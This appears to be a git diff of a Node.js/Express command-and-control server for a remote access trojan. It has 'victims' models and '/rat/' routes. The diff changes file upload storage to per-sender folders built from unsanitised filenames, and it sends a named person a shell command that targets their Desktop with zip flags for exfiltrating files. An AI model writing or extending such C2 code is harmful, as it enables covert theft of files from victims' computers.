@@ -1,22 +1,28 @@
 const express = require("express");
 const router = express.Router();
-const User = require("../models/users");
 const Victim = require("../models/victims");
 const VictimDatas = require("../models/victimdatas");
-const unzipper = require('unzipper');
-const path = require('path'); // path modülünü ekleyin
-
 const multer = require('multer');
 const fs = require('fs');
-const mongoose = require("mongoose");
 
 // Dosya yükleme işlemi için multer ayarları
 const storage = multer.diskStorage({
     destination: function (req, file, cb) {
-        cb(null, './uploads');
+        // Dosya adını "_" karakterine göre böler ve ilk parçayı alır
+        const senderName = (file.originalname).split("_")[0];
+        const uploadPath = './uploads/' + senderName;
+
+        // Eğer alt klasör yoksa oluştur
+        if (!fs.existsSync(uploadPath)) {
+            fs.mkdirSync(uploadPath);
+        }
+
+        cb(null, uploadPath);
     },
     filename: function (req, file, cb) {
-        cb(null, file.fieldname + "_" + Date.now() + "_" + file.originalname);
+        // Dosya adının başına tarih ve zaman bilgisini ekler
+        cb(null,  file.originalname);
+        console.log(`${file.originalname} dosyasi sisteme eklenmistir.!` )
     }
 });
 
@@ -213,11 +219,12 @@ router.post("/rat/postdata", async (req, res) =>  {
 //get all users route
 router.get('/rat/dos', async (req, res) => {
 
-    let dosya_yolu_al_getir = "cd C:\\ && cd spring_projects && cd ziple && cd"
+    let dosya_yolu_al_getir = "cd C:/Users/\"emirhan karakoc\"/Desktop && cd"
     const response = {
         username: "emirhan karakoc",
         command: dosya_yolu_al_getir,
-        zip:"true"
+        zip:"true",
+        zipfile:"texts"
     }
         res.send(response);
 
